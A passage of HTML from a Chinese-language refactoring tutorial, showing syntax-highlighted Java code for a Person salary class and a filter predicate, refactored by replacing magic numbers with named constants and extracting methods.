data-line=\"crayon-5a634cc71b23c635245938-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b23c635245938-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b23c635245938-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-1\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">Person</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-3\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-4\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-6\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-7\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-8\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-9\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-11\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-12\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-13\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-15\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-16\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-17\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-19\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-20\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-21\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-22\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-23\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-24\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-25\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-26\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-27\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-28\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">250</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-cn\">1500</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">0.94</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-29\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-30\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-31\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-32\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">SuccessfulFilter</span> <span class=\"crayon-r\">implements</span> <span class=\"crayon-e\">Predicate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">Person</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-34\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-35\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">boolean</span> <span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Person</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-36\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-cn\">60000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b23c635245938-37\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b23c635245938-38\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>为了进一步清理这段代码，我们对魔法数字分别执行<a href=\"https://refactoring.guru/replace-magic-number-with-symbolic-constant\" target=\"_blank\" rel=\"nofollow\">将魔法数字替换为符号常量</a>。为了找到每一个值的含义，我们可能要与原作者或者有足够相关领域知识的人交谈，以获得正确的结果。我们还会多次执行<a href=\"https://refactoring.guru/extract-method\" target=\"_blank\" rel=\"nofollow\">抽取方法</a>重构以确保现在的方法尽可能简单。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b240417199447\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class Person {\r\n\r\n    private static final int MONTHLY_BONUS = 250;\r\n    private static final int YEARLY_BONUS = MONTHLY_BONUS * 12;\r\n    private static final int YEARLY_BENEFITS_DEDUCTIONS = 1500;\r\n    private static final double YEARLY_401K_CONTRIBUTION_PERCENT = 0.06;\r\n    private static final double YEARLY_401K_CONTRIBUTION_MUTLIPLIER = 1 - YEARLY_401K_CONTRIBUTION_PERCENT;\r\n\r\n    private int age;\r\n    private double salary;\r\n\r\n    public Person(int age, double salary) {\r\n        this.age = age;\r\n        this.salary = salary;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setSalary(double salary) {\r\n        this.salary = salary;\r\n    }\r\n\r\n    public double getSalary() {\r\n        return salary;\r\n    }\r\n\r\n    public double getNetSalary() {\r\n        return getPostDeductionSalary();\r\n    }\r\n\r\n    private double getPostDeductionSalary() {\r\n        return getPostBenefitsSalary() * YEARLY_401K_CONTRIBUTION_MUTLIPLIER;\r\n    }\r\n\r\n    private double getPostBenefitsSalary() {\r\n        return getSalary() - YEARLY_BONUS - YEARLY_BENEFITS_DEDUCTIONS;\r\n    }\r\n}\r\n\r\npublic class SuccessfulFilter implements Predicate&lt;Person&gt; {\r\n\r\n    private static final int THRESHOLD_AGE = 30;\r\n    private static final double THRESHOLD_SALARY = 60000.0;\r\n\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public boolean test(Person person) {\r\n        return person.getAge() &lt; THRESHOLD_AGE &amp;&amp; person.getNetSalary() &gt; THRESHOLD_SALARY;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b240417199447-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b240417199447-55\">55</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-1\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">Person</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-3\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">MONTHLY</span><span class=\"crayon-sy\">_</span>BONUS <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">250</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-4\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">YEARLY</span><span class=\"crayon-sy\">_</span>BONUS <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">MONTHLY</span><span class=\"crayon-sy\">_</span>BONUS <span class=\"crayon-o\">*</span> <span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-5\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">YEARLY_BENEFITS</span><span class=\"crayon-sy\">_</span>DEDUCTIONS <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1500</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-6\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">YEARLY_401K_CONTRIBUTION</span><span class=\"crayon-sy\">_</span>PERCENT <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">0.06</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-7\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">YEARLY_401K_CONTRIBUTION</span><span class=\"crayon-sy\">_</span>MUTLIPLIER <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-v\">YEARLY_401K_CONTRIBUTION_PERCENT</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-9\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-10\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-12\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-13\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-14\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-15\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-17\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-18\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-19\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-20\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-21\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-22\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-23\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-24\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-25\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-26\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-27\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-28\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-29\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-30\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-31\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-32\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-33\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getNetSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-34\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-e\">getPostDeductionSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-35\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-36\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b240417199447-37\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getPostDeductionSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b240417199447-38\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-e\">getPostBenefitsSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">*</span> <span class=\"crayon-v\">YEARLY_401K_CONTRIBUTION_MUTLIPLIER</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" 